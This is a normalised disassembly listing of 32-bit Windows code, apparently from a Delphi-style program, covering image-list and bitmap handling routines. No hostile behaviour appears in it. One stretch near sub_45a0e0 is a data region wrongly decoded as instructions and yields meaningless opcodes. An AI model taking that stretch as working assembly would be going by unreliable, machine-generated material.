add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4599ec
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403190
mov eax [ esi + 0x9c ]
call sub_403190
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45929c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d1d0
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_459a3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b68
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_459ae8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_459b48
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_459c50
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_459d88
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_459de8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_459e44
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_459ea8
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459ae8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40432c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459b48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_459c40
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_459600
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4595ec
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_459b48
sub_459c50
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459cc8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40432c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418470
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418470
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
sub_459d30
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459d88
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40432c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459de8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459e44
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459ea8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418470
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403340
test eax eax
je r-xdata
sub_459f08
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40432c
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420cac
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_459ae8
sub_459f54
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_459f7c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_459408
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_459b48
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_45a010
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a2a8
mov edi eax
mov eax esi
call sub_45ceec
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_45a03c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_45a080
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a0a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a0ac
retn
sub_45a0e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx - 0x5ecfffbb ] ah
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] bh
inc ebp
add [ edi ] al
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
hlt
add [ eax ] al
add [ eax + 0x70045a1 ] dl
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
sub al 0xa2
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
or eax [ edx ]
in al 0xe
inc edx
add al bh
mov [ 0xffffffffacf80045 ] al
inc ebp
add [ esp ] al
inc ebp
add [ eax ] al
mov edx 0xba8c0045
inc ebp
add [ ebx + esi * 4 ] al
inc ebp
add [ ecx ] al
add bh ch
call [ ebx + esi * 4 ]
inc ebp
add [ eax ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
cwde
mov [ 0xffffffffb1c40045 ] eax
inc ebp
add [ ebp + esi * 4 + 0x45 ] cl
add [ ecx + esi * 4 ] al
inc ebp
add [ ebx + ecx + 0xa700042 ] ah
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
mov [ 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
popad
jb r-xdata
mov eax 0x20000000
retn
je r-xdata
add [ eax ] eax
inc ebp
add [ eax - 0x5e ] bh
inc ebp
add [ eax ] ch
add [ eax ] al
xor al 0x6b
inc ecx
add ah al
push cs
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45a2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5e ] dh
outsb
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x9000408d
mov [ 0x10070045 ] al
push esp
inc ebx
jne r-xdata
mov eax eax
xchg esp eax
mov eax [ 0xa030045 ]
push esp
dec ecx
insd
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xa194c08b
inc ebp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
je r-xdata
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ ecx ] al
add [ gs : eax ] eax
fimul [ ebx - 0x742dcc10 ]
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor [ ecx + eax * 2 ] ch
add al [ eax ]
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_45a2f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420754
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_45a344
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_420754
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_45a398
push ebx
push esi
push edi
call sub_40355c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418558
mov edx eax
mov eax edi
call sub_45b364
mov eax [ edi + 0x50 ]
call sub_403190
mov eax edi
call sub_45a6f4
mov eax [ edi + 0x4c ]
call sub_403190
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4207a0
test bl bl
jle r-xdata
call sub_403190
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
sub_45a404
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45a4b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45b2ec
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45a4d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a4b8
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_45a4d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45a571
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4296c0
mov eax ebx
call sub_428ba0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_42420c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_428ba0
pop edx
call sub_4245b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a578
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45a594
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_45a4d0
pop ecx
pop edx
pop ebx
retn
sub_45a5cc
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_45a4bc
test al al
je r-xdata
mov eax esi
call sub_45ac8c
mov eax esi
call sub_45a4d0
mov eax esi
mov si 0xffef
call sub_40338c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_45a610
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_45a4bc
test al al
je r-xdata
mov eax esi
call sub_45ac8c
mov eax esi
call sub_45a4d0
mov eax esi
mov si 0xffef
call sub_40338c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_45a654
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a6f4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45a594
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40338c
sub_45a6a0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45b274
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_428c0c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a6f4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40338c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_45a690
push eax
call ImageList_Destroy
sub_45a72c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45a7bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45a4bc
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7c6
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov edx eax
mov eax ebx
call sub_45ac98
sub_45a7cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a87b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a85e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a4c4
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a6a0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a6a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a865
mov eax [ ebp - 0x10 ]
call sub_403190
retn
sub_45a898
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a997
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a6a0
push eax
mov eax [ ebp - 0x4 ]
call sub_45a690
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a99e
mov eax [ ebp - 0xc ]
call sub_403190
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a959
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_429a64
mov eax [ ebp - 0x4 ]
call sub_45a4c4
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a680
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a6a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403190
retn
sub_45a9b4
push ebx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45a690
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_45a9d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45abef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a4bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45abf6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f44
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b274
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a898
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
push ebp
push sub_45aba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ab80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45ab63
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_429910
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
